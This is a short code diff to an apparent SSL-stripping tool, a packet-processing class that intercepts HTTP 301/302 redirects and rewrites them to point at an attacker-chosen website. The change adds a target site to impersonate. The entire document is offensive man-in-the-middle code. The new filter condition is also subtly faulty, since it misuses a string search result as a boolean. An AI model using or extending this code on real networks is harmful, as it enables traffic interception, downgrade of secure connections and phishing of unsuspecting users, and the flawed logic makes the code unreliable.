@@ -16,8 +16,9 @@ global list_of_dns
 # intercepts switch to https from server, redirects to chosen website
 class SimpleSslStrip:
     # intiializes the desired ip to redirect to
-    def __init__(self, attacker_website_redirect):
+    def __init__(self, attacker_website_redirect, site_to_impersonate):
         self.attacker_website_redirect = attacker_website_redirect
+        self.site_to_impersonate = site_to_impersonate
 
     # processes the packets coming through the linux machine
     def process_http_response(self, packet):
@@ -27,7 +28,7 @@ class SimpleSslStrip:
             my_load = my_packet[Raw].load.decode('latin-1')
 
             # checks if it is a http redirect
-            if my_load.find("301") != -1 or my_load.find("302") != -1:
+            if (my_load.find("301") != -1 or my_load.find("302") != -1) and my_load.find(self.site_to_impersonate) :
                 my_packet = self.modify(my_packet, my_load)
                 packet.set_payload(bytes(my_packet))
 
